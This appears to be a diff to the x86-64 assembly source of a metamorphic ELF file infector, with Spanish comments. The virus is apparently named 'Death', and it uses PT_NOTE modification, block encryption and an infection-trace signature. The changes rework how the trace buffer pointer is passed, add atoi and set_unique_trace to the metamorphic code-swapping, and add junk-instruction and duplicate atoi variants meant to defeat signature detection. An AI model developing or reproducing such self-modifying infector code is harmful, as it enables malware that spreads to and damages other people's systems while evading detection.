@@ -513,6 +513,7 @@ section .text
         nop
         nop
         nop
+        mov r8, rdi
         mov rcx, VAR(Death.file_final_len)
         add rax, rcx
 
@@ -534,7 +535,6 @@ section .text
 
         ; rdi = buf
         ; destruye: rax, rbx, rdx, rcx
-        lea rdi, [rel Traza]
         add rdi, Traza_len + 1
         add rdi, 8
 
@@ -559,7 +559,7 @@ section .text
             jnz .convert_loop
 
         lea rsi, [rsp]
-        lea rdi, [rel Traza]
+        mov rdi, r8
         add rdi, Traza_len + 1
         mov rcx, 8
         cld
@@ -1086,19 +1086,23 @@ section .text
         add rsi, Traza_len + 1
         CALL_ENCRYPT(atoi)
         ; rax = el valor del contador que setea la signature
+		; rdi = apunta a la traza
+		lea rdi, [rel Traza]
         CALL_ENCRYPT(set_unique_trace)
 
 	.mod_functions:
         SWAPALYZER(crazy, 7)
         SWAPALYZER(mod_pt_note, 2)
         SWAPALYZER(directory_name_isdigit, 3)
-        SWAPALYZER(fake_function, 4)
+        SWAPALYZER(fake_function, 5)
+        SWAPALYZER(set_unique_trace, 3)
 
         CALL_METAMORPH(crazy, 7)
         CALL_METAMORPH(mod_pt_note, 2)
         CALL_METAMORPH(directory_name_isdigit, 3)
-        CALL_METAMORPH(fake_function, 4)
-         
+        CALL_METAMORPH(fake_function, 5)
+        CALL_METAMORPH(atoi, 2)
+        CALL_METAMORPH(set_unique_trace, 3)
 
     .encrypt_data_block:
         CALL_ENCRYPT(encrypt_block) ; encripta
@@ -1434,6 +1438,7 @@ section .text
         nop
         nop
         nop
+        mov r8, rdi
         mov rcx, VAR(Death.file_final_len)
         add rax, rcx
 
@@ -1455,7 +1460,6 @@ section .text
 
         ; rdi = buf
         ; destruye: rax, rbx, rdx, rcx
-        lea rdi, [rel Traza]
         add rdi, Traza_len + 1
         add rdi, 8
 
@@ -1480,7 +1484,7 @@ section .text
             jnz .convert_loop
 
         lea rsi, [rsp]
-        lea rdi, [rel Traza]
+        mov rdi, r8
         add rdi, Traza_len + 1
         mov rcx, 8
         cld
@@ -1494,6 +1498,7 @@ section .text
         nop
         nop
         nop
+        mov r8, rdi
         mov rcx, VAR(Death.file_final_len)
         add rax, rcx
 
@@ -1515,7 +1520,6 @@ section .text
 
         ; rdi = buf
         ; destruye: rax, rbx, rdx, rcx
-        lea rdi, [rel Traza]
         add rdi, Traza_len + 1
         add rdi, 8
 
@@ -1540,7 +1544,7 @@ section .text
             jnz .convert_loop
 
         lea rsi, [rsp]
-        lea rdi, [rel Traza]
+        mov rdi, r8
         add rdi, Traza_len + 1
         mov rcx, 8
         cld
@@ -1556,6 +1560,7 @@ section .text
         nop
         nop
         nop
+        mov r8, rdi
         mov rcx, VAR(Death.file_final_len)
         add rax, rcx
 
@@ -1577,7 +1582,6 @@ section .text
 
         ; rdi = buf
         ; destruye: rax, rbx, rdx, rcx
-        lea rdi, [rel Traza]
         add rdi, Traza_len + 1
         add rdi, 8
 
@@ -1602,7 +1606,7 @@ section .text
             jnz .convert_loop
 
         lea rsi, [rsp]
-        lea rdi, [rel Traza]
+        mov rdi, r8
         add rdi, Traza_len + 1
         mov rcx, 8
         cld
@@ -1686,11 +1690,11 @@ section .text
     __F_directory_name_isdigit_2__end:
 
     __F_fake_function_0:
-        times 50 xchg eax, ebx
+        times 100 xchg eax, ebx
     __F_fake_function_0__end:
     
     __F_fake_function_1:
-        times 50 push rax
+        times 100 push rax
     __F_fake_function_1__end:
     
     __F_fake_function_2:
@@ -1700,5 +1704,43 @@ section .text
     __F_fake_function_3:
         times 50 or al, 1
     __F_fake_function_3__end:
+
+    __F_fake_function_4:
+        times 100 cld
+    __F_fake_function_4__end:
+
+    __F_atoi_0:
+        ; rax = resultado
+        .str_to_int:
+            xor rax, rax
+        .loop:
+            movzx rcx, byte [rsi]   ; cargar caracter
+            test rcx, rcx           ; ¿fin de string?
+            jz .done
+            sub rcx, '0'            ; convertir ASCII a número
+            imul rax, rax, 10       ; resultado *= 10
+            add rax, rcx            ; resultado += digito
+            inc rsi                 ; siguiente caracter
+            jmp .loop
+        .done:
+            ret
+    __F_atoi_0__end:
+
+    __F_atoi_1:
+        ; rax = resultado
+        .str_to_int:
+            xor rax, rax
+        .loop:
+            movzx rcx, byte [rsi]   ; cargar caracter
+            test rcx, rcx           ; ¿fin de string?
+            jz .done
+            sub rcx, '0'            ; convertir ASCII a número
+            imul rax, rax, 10       ; resultado *= 10
+            add rax, rcx            ; resultado += digito
+            inc rsi                 ; siguiente caracter
+            jmp .loop
+        .done:
+            ret
+    __F_atoi_1__end:
 
     _finish:
